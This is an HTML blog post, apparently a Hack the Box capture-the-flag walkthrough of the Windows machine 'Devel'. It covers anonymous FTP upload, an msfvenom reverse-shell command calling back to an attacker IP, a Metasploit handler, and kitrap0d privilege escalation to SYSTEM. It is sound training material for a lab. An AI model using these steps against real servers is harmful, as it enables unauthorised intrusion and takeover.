          Technical Walkthrough of Hack the Box's Devel machine. Devel is a Windows
          machine, rated as an easy. It’s been about 8 months since I was last
          active on Hack the Box, so I wanted to get back into the groove with a
          pretty easy machine. The enumeration and exploitation process was quick
          and simple. I’d recommend this machine for beginners.
        </p>
        <!-- Enumeration -->

          I started the information gathering with a typical nmap scan of the common ports.
          The results show that port 80 (http), and 21 (ftp) are open. The nice thing about ftp results
          on nmap is that it will also show if ‘Anonymous’ login is allowed. This means you don’t
          need to know a set of login credentials. Instead enter the username of ‘anonymous’ and leave the password
          field blank (just press enter) when prompted. It even lists the files in the folder
          we will have access to. Note: The files listed look like ones left over from other people
          using the box.
        </p>
        <img class ="article-image"
          src="../images/CS-Images/Devel/nmap-1.png" alt="nmap-image"><br><br>
        <p>
          To ftp, enter ‘ftp &lt;ip address&gt;’ and put your creds. Since we know
          that ‘anonymous’ is accepted then I’ll use that as my username and press
          enter when prompted for passwords. To list the files in the directory that
          you are in type ‘dir’. Here we can see that there are a lot of files that
          seem to be from other users, the ‘iisstart.html’ is the welcome page,
          and ‘welcome.png’ is the image that's displayed on the main page.
          I doubt there is any steganography on this welcome
          png, and I didn't see anything useful in the html's source code.
          On more difficult boxes that would be something to look into.

        </p>

        <!-- exploation -->
        <h4 id="Exploitation">Exploitation:</h4>
        <p>
          I found out I have privileges to transfer files, so I'll try putting a payload to get
          a reverse shell.
          I’ll be using msfvenom to create the payload, and metasploit to set up the
          listener to get my reverse shell. I used the payload
          ‘windows/meterpreter/reverse_tcp’, then set the local host ‘LHOST’
          to your machine and the listening port ‘LPORT’ to the port you want
          to listen on. Note: you can find your IP with 'ifconfig' and it's listed
          under tun0. The port can pretty much be any one that isn’t a common
          port. I used '5555' since it’s easy to remember, and I'll name the file 'jv-devel.aspx'.
        </p>
        <pre><code>
    msfvenom -p /windows/meterpreter/reverse_tcp -f aspx -o jv-devel.aspx LHOST=10.10.14.30 LPORT=5555
        </code></pre>
        <img class ="article-image"
          src="../images/CS-Images/Devel/create-payload.png" alt="ftp-image"><br><br>

        <p>
          With the payload created, we can now put it on the target machine through ftp.
          To transfer the file type 'put &lt;your file name&gt;' in my case 'put jv-devel.aspx'.
          Then 'dir' to make sure it's listed.
        </p>
        <img class ="article-image"
          src="../images/CS-Images/Devel/put-payload.png" alt="ftp-image"><br><br>
        <p>
          Now it’s time to set up the listener on metasploit, enter ‘msfconsole’ in a
          command prompt. The exploit for the msfvenom shells is ‘exploit/multi/handler’.
          Here we set the options to match what we used when we created the payload with
          msfvenom. Set payload to ‘windows/meterpreter/reverse_tcp’, set lhost to your
          attacking machine, and the port to the whichever you choose. Once completed, double check
          the setting with ‘show options’.
        </p>
        <img class ="article-image"
          src="../images/CS-Images/Devel/set-listener.png" alt="ftp-image"><br><br>

        <p>
          To execute either enter ‘run’ or ‘exploit’, but I prefer to use
          ‘exploit’ since it feels cooler to type out.<br>
          Take note that it says it created a session '1' as this info will be use later on.
        </p>
        <img class ="article-image"
          src="../images/CS-Images/Devel/first-exploit-run.png" alt="ftp-image"><br><br>

        <p>
          I got a shell on my first try, but these boxes are being used
          constantly so if you don’t get a shell right away try 2-3 more times.<br>
          Enter 'shell' to get a working shell prompt.
        </p>
        <img class ="article-image"
          src="../images/CS-Images/Devel/first-exploit-shell.png" alt="ftp-image"><br><br>
        <p>
          Nothing too useful in the folders, the User folders of Babis and Administrators
          get access denied. Right away I got the systeminfo for the machine, and ran it
          through Windows
          Exploit Suggester. However, it didn’t lead me to one I could use, and I ended
          up just using metasploit for the privilege escalation. I’ll still provide the
          images for it below.
        </p>
        <img class ="article-image"
          src="../images/CS-Images/Devel/sysinfo.png" alt="ftp-image"><br><br>
        <img class ="article-image"
            src="../images/CS-Images/Devel/Win-Exploit-sug.png" alt="ftp-image"><br><br>
        <p>
          Exiting the shell and changing to '/multi/recon/local_exploit_suggester'
          I list the possible exploits. With a couple trial and errors I find
          the right exploit of '/exploit/windows/local/ms10_015_kitrap0d'. Type 'show options'
          to see what needs to be set. Looks like just the session. As noted eariler,
          session 1 is being used for inital exploit, so we just need to enter 'set session 1'.
          Then execute with 'exploit' or 'run'.
        </p>
        <img class ="article-image"
          src="../images/CS-Images/Devel/set-system-exploit.png" alt="ftp-image"><br><br>
          <img class ="article-image"
            src="../images/CS-Images/Devel/set-exploit-2.png" alt="ftp-image"><br><br>
        <p>
          Sweet, we got our Meterpreter session back.
          Enter ‘shell’ to go to a shell, then check what account we are in with ‘whoami’.
          Now the fireworks can be set off as we see that we are now ‘System’ and can access
          the Babis and Administrator folder.
        </p>
        <img class ="article-image"
          src="../images/CS-Images/Devel/system-access.png" alt="ftp-image"><br><br>
        <p>
          To get the root and user flags, change directories 'cd' to get the 'Users' folders
          then check the 'Desktop'
          folders for 'Babis' and 'Administrator'. <br>Since this is a Windows machine, to
          print out the contents of a text file enter 'type &lt;file name&gt;'.
        </p>
        <img class ="article-image"
          src="../images/CS-Images/Devel/user-txt.png" alt="ftp-image"><br><br>
